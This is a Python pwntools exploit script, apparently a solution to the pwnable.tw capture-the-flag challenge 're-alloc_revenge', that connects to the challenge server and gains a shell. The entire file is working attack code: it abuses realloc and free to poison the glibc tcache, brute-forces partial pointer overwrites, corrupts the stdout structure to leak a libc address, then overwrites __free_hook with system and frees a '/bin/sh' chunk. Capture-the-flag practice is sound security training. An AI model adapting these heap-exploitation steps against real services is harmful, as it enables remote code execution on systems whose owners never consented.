from pwn import *

elf = ELF("re-alloc_revenge")
libc = ELF('libc.so')


def alloc(index, size, data):
    r.recvuntil('Your choice: ')
    r.sendline('1')
    r.recvuntil('Index:')
    r.sendline(str(index))
    r.recvuntil('Size:')
    r.sendline(str(size))
    r.recvuntil('Data:')
    r.send(data)


def realloc(index, size, data):
    r.recvuntil('Your choice: ')
    r.sendline('2')
    r.recvuntil('Index:')
    r.sendline(str(index))
    r.recvuntil('Size:')
    r.sendline(str(size))
    if size == 0:
        return
    r.recvuntil('Data:')
    r.send(data)


def free(index):
    r.recvuntil('Your choice: ')
    r.sendline('3')
    r.recvuntil('Index:')
    r.sendline(str(index))


while True:
    while True:
        r = remote('chall.pwnable.tw', 10310)

        alloc(0, 0x48, 'A')
        realloc(0, 0, '')
        realloc(0, 0x48, p64(0) + p64(0))
        realloc(0, 0, '')
        realloc(0, 0x48, '\x10\x80')

        alloc(1, 0x48, 'A')
        realloc(1, 0x58, 'A')
        free(1)
        try:
            alloc(1, 0x48, b'\0' * 0x23 + b'\x07')
            realloc(1, 0, '')
            message = r.recvline()
            if message == b'free(): invalid pointer\n':
                raise EOFError('Incorrect Guess')
            break
        except EOFError:
            r.close()

    realloc(1, 0x48, '\x58\x87')
    realloc(0, 0x38, p64(0) + p64(0))
    free(0)
    alloc(0, 0x48, 'A')
    realloc(0, 0x38, 'A')
    free(0)
    try:

        alloc(0, 0x40, b'/bin/sh\0' + p64(0xfbad1800) + p64(0) * 3)
        leak = r.recvline()
        if leak.startswith(b'$$$$$$$$$$$$$$$$$$$$$$$$$$$$'):
            raise EOFError('Incorrect Guess')
        break
    except EOFError:
        r.close()

libc_leak = u64(leak[8:16])
log.info("libc_leak %s" % hex(libc_leak))
libc.address = libc_leak - 0x1e7570
log.success("libc_base %s" % hex(libc.address))

realloc(1, 0x48, p64(0) * 8 + p64(libc.sym['__free_hook']))
free(1)
alloc(1, 0x18, p64(libc.sym['system']))

free(0)

r.interactive()
